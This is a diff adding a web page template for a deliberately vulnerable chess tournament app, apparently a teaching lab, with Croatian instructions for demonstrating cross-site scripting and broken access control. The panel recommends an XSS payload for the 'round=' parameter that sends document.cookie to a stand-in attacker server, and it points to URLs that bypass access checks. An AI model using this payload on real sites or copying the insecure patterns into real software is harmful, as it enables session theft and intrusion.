@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdn.datatables.net/1.10.2/css/jquery.dataTables.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+  </head>
+  <body>
+    <div class="content-form" style="float:left;">
+      <input type="button" id="btnLogin" value="Login"/>
+      <div id="user"></div>
+      <input type="button" id="btnLogout" value="Logout" style="display: none;"/>
+    </div>
+    <div class="content-form" style="float:right;">
+      <input type="checkbox" id="xss" name="xss" value="xss">
+      <label for="xss">XSS</label><br>
+      <input type="checkbox" id="bac" name="bac" value="bac">
+      <label for="bac">Bad Access Control</label><br>
+      <br>
+      <p id="bacinstructions">Sada možete sami u url napisati 
+        <a href="https://localhost:4092/member/1?bac=true">https://localhost:4092/member/1?bac=true</a> ili 
+        <a href="https://localhost:4092/admin/1?bac=true">https://localhost:4092/admin/1?bac=true</a> i prikazat će vam se adekvatan sadržaj. Ili možete kliknuti na ove linkove.</p>
+      <div id="xssinstructions">
+        <p >Sada možete sami u url umjesto broja runde dakle nakon round= upisati bilo što i to će se prikazati umjesto broja runde. <br> 
+        Tu je također i ranjiv 'member' unutar url-a jer ako upišete blabla ispisat će se You are logged in as blabla jer se member/admin u "You are logged in as a member/admin." ispisuje
+        tako što se iz url-a vadi je li korisnik admin ili member što je zapravo i bad access control ali to ovdje nije u prvom planu već mogućnost ugrađivanja skripte u stranicu.; 
+        premda ovdje script tag u url-u umjesto member ili admin neće proći jer se ne prolazi ruta koja sadrži '<'.<br>
+        Zapravo ranjivi dio stranice je query za broj runde dakle round= i područje za upisivanje komentara. Što ste i vidjeli kada ste aktivirali XSS pa je iskočio alert prozor, to je
+        zato sto je jedan script tag već uključen u jedan od komentara.
+        </p>
+        <br>
+        <p>Kao svoj primjer preporučujem staviti nakon round= ovaj dio koda</p>
+        <p>&lt;b> onmouseover="document.location.href='http://www.mojserverxss.hr?cookie=' + document.cookie;">? - Round hasn't loaded correctly, please click here to retry.&lt;/b></p>
+        <p>koji stvara mouseover od broja runde koji (potencijalno) krade cookie i preusmjerava ga na neku drugu (moju) web aplikaciju.</p>
+      </div>
+    </div>
+    <div class="container">
+      <div class="row header" style="text-align:center;color:green">
+        <h3>Super United Croatia Rapid & Blitz 2022</h3>
+      </div>
+      
+      <h3 style="margin-top: 150px;" id="round">Round <%= num_of_round %></h3>
+      <table id="example" class="table table-striped table-bordered" style="width:100%">
+              <thead>
+                  <tr style="text-align: center;">
+                      <th>Player 1</th>
+                      <th>Player 2</th>
+                      <th>Winner</th>
+                  </tr>
+              </thead>
+              <tbody>
+                  <% for(let i=0; i<games.length; i++) { %>
+                    <tr style="text-align: center;" class="score">
+                        <td><%= games[i].player1_firstname %> <%= games[i].player1_lastname %></td>
+                        <td><%= games[i].player2_firstname  %> <%= games[i].player2_lastname %></td>
+                          <form action="/<%=Number(num_of_round)%>" method="POST" class="edit-score-form">
+                            <td class="row-of-table">
+                              <div class="value-of-cell">
+                                <% if(games[i].winner_firstname == null) { %>
+                                  Draw 
+                                <% }else{ %>
+                                  <%= games[i].winner_firstname  %> <%= games[i].winner_lastname %>
+                                <% } %>
+                              </div>
+                              <input type="button" style="float:right; display: none;" value="Edit" class="btnEditScore"/>
+                              <input type="button" style="float:right; display: none;" value="Save" class="btnSaveScore"/>
+                              <input type="hidden" name="editedScore" class="editedScore">
+                              <input type="hidden" name="id_game" value="<%= games[i].id_game %>">
+                              <input type="hidden" name="_method" class="_method" value="PUT">
+                            </td>
+                          </form>
+                    </tr>
+                  <% } %>
+              </tbody>
+      </table>
+
+      <div class="wrapper">
+        <nav aria-label="Page navigation example">
+          <ul class="pagination">
+            <% if(num_of_round == 1) { %>
+              <li class="page-item"><a class="page-link">Previous round</a></li>
+            <% } else { %>
+              <li class="page-item"><a class="page-link" href="<%= Number(num_of_round) - 1 %>">Previous round</a></li>
+            <% } %>
+            <% for(let i=1; i<=num_of_rounds; i++) { %>
+              <li class="page-item"><a class="page-link" href="<%= i %>"><%= i %></a></li>
+            <% } %>
+            <li class="page-item"><a class="page-link" href="<%= Number(num_of_round) + 1 %>">Next round</a></li>
+          </ul>
+        </nav>
+      </div>
+      
+      <div id="comment_section" style="display: none;">
+        <div class="center">
+          <h3>Comments</h3>
+        </div>
+        <div class="container mt-5">
+          <div class="row d-flex justify-content-center">
+              <div class="col-md-9">
+                  <div class="shadow p-3 bg-white rounded">
+                      <div class="d-flex justify-content-between align-items-center" style="float:left;">    
+                          <div class="d-flex flex-row align-items-center"> <b class="mr-1 fs-14">Post a comment</b></div>
+                      </div>
+                      <form action="/<%=Number(num_of_round)%>" method="POST">
+                        <div class="mt-4">
+                            <div id="username"></div>
+                            <input type="hidden" id="user_email" name="username" value="">
+                            <div class="w-100 ml-2 comment-area"> <textarea class="form-control" id="comment" name="comment" maxlength="300"></textarea>
+                                <button type="submit" class="btn btn-secondary btn-block mt-2 post-btn">Post</button> </div>
+                        </div>  
+                      </form>
+                      <% for(let i=0; i<comments.length; i++) { %>
+                      <div class="d-flex flex-row mt-4"> <img src="https://i.imgur.com/jD4jCW9.png" width="40" height="40" style="margin-right: 10px;">
+                          <div class="ml-2 w-100">
+                              <div class="d-flex justify-content-between align-items-center">
+                                  <div class="d-flex flex-row align-items-center"> <b class="font-weight-bold name"><%= comments[i].user_id %></b></div>
+                              </div>
+
+                              <form action="/<%=Number(num_of_round)%>" method="POST" class="edit-comment-form">
+                                <p class="user-comment-text text-justify mt-2" contenteditable="false"><%= comments[i].text %></p>
+                                <div><%= comments[i].date_posted %></div>
+                                
+                                <div class="<%= comments[i].user_id %>">
+                                  <input type="button" style="float:right; display: none;" value="Edit" class="btnEditComment"/>
+                                  <input type="button" style="float:right; display: none;" value="Delete" class="btnDelComment"/>
+                                  <input type="button" style="float:right; display: none;" value="Save" class="btnSaveComment"></button> 
+                                </div>
+                                <input type="hidden" name="text" class="comment-text" value="<%= comments[i].text %>"/>
+                                <input type="hidden" name="comment_id" value="<%= comments[i].comment_id %>"/>
+                                <input type="hidden" name="_method" class="_method" value="PUT">
+                                  
+                              </form>
+                          </div>
+                      </div>
+                      <% } %>
+                  </div>
+              </div>
+            </div>
+      </div>
+      </div>
+    </div>
+    
+  <script src="/javascripts/site.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
+  <script src="https://cdn.auth0.com/js/auth0-spa-js/1.20/auth0-spa-js.production.js"></script>
+  </body>
+</html>
+
+
